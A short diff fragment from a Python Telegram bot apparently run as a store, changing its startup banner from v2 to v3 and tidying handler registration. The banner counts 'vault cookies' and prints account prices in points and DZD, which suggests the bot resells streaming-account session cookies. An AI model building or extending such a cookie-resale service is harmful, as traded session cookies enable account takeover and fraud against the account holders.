+        return
 
     if data == "back_home":
         await back_home(update, context); return
@@ -1925,18 +1772,16 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ============================================================
 def main():
     print("=" * 55)
-    print(f"  🎬 {STORE_NAME} BOT v2")
+    print(f"  🎬 {STORE_NAME} BOT v3")
     print("=" * 55)
     print(f"  Vault: {count_vault_cookies()}")
-    print(f"  Price: {get_account_price()} points")
+    print(f"  Price: {get_account_price()} pts")
     print(f"  Market: {get_market_price()} DZD")
     print(f"  Channel: {CHANNEL_ID}")
     print("=" * 55)
 
     app = ApplicationBuilder().token(BOT_TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
-
     app.add_handler(CallbackQueryHandler(callback_router))
     app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, file_upload))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
